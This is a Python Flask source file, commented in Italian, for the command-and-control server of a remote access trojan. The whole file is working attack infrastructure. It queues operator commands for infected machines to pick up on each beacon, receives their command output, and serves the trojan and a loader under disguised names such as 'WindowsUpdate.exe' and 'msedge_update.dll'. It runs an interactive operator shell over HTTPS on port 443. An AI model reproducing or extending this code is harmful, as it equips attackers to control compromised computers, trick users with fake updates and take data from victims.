#!/usr/bin/env python3
"""
RAT C2 Server — Flask HTTPS
Stadio 1: beacon loop + command dispatch + download endpoint
"""

from flask import Flask, request, jsonify, send_file
import os
import json
from datetime import datetime
import threading

app = Flask(__name__)

# Coda comandi da inviare al RAT
pending_commands = []

# Risultati ricevuti dal RAT
results = []

# ── Beacon endpoint ─────────────────────────────────────
@app.route('/beacon', methods=['GET'])
def beacon():
    """Il RAT chiama questo endpoint ogni N minuti."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    agent_ip = request.remote_addr
    print(f"\n[+] Beacon ricevuto da {agent_ip} alle {timestamp}")

    if pending_commands:
        cmd = pending_commands.pop(0)
        print(f"[>] Invio comando: {cmd}")
        return jsonify({"cmd": cmd}), 200

    return jsonify({"cmd": ""}), 200


# ── Result endpoint ──────────────────────────────────────
@app.route('/result', methods=['POST'])
def result():
    """Il RAT invia il risultato del comando eseguito."""
    data = request.get_json()
    if data:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        agent_ip = request.remote_addr
        output = data.get('output', '')
        print(f"\n[<] Risultato da {agent_ip} alle {timestamp}:")
        print(f"    {output}")
        results.append({
            'ip': agent_ip,
            'time': timestamp,
            'output': output
        })
    return jsonify({"status": "ok"}), 200
    
# ── Serve rat.dll ────────────────────────────────────────
@app.route('/update_dll', methods=['GET'])
def download_dll():
    rat_path = os.path.join(os.path.dirname(__file__), '..', 'client', 'rat.dll')
    return send_file(rat_path, as_attachment=True, download_name='msedge_update.dll')

# ── Serve test_loader.exe ────────────────────────────────
@app.route('/loader', methods=['GET'])
def download_loader():
    loader_path = os.path.join(os.path.dirname(__file__), '..', 'client', 'test_loader.exe')
    return send_file(loader_path, as_attachment=True, download_name='test_loader.exe')

# ── Download endpoint ────────────────────────────────────
@app.route('/update', methods=['GET'])
def download():
    """Endpoint per scaricare rat.exe mascherato da aggiornamento."""
    rat_path = os.path.join(os.path.dirname(__file__), '..', 'client', 'rat.exe')
    return send_file(rat_path, as_attachment=True, download_name='WindowsUpdate.exe')


# ── Shell interattiva ────────────────────────────────────
def interactive_shell():
    """Loop interattivo per inviare comandi al RAT."""
    print("\n[*] C2 Server avviato.")
    print("[*] Digita comandi da inviare al RAT.")
    print("[*] Il comando verra eseguito al prossimo beacon.")
    print("[*] Digita 'quit' per uscire.\n")

    def input_loop():
        while True:
            try:
                cmd = input("C2> ")
                if cmd.lower() == 'quit':
                    os._exit(0)
                if cmd.strip():
                    pending_commands.append(cmd)
                    print(f"[*] Comando in coda: {cmd}")
            except (EOFError, KeyboardInterrupt):
                os._exit(0)

    t = threading.Thread(target=input_loop, daemon=True)
    t.start()


# ── Main ─────────────────────────────────────────────────
if __name__ == '__main__':
    certs_dir = os.path.join(os.path.dirname(__file__), 'certs')
    cert_file = os.path.join(certs_dir, 'server.crt')
    key_file  = os.path.join(certs_dir, 'server.key')

    if not os.path.exists(cert_file):
        print("[-] Certificato non trovato. Genera con:")
        print("    openssl req -x509 -newkey rsa:4096 -keyout certs/server.key -out certs/server.crt -days 365 -nodes")
        exit(1)

    interactive_shell()

    print(f"[*] Avvio C2 server su https://0.0.0.0:443")
    app.run(
        host='0.0.0.0',
        port=443,
        ssl_context=(cert_file, key_file),
        debug=False,
        threaded=True
    )
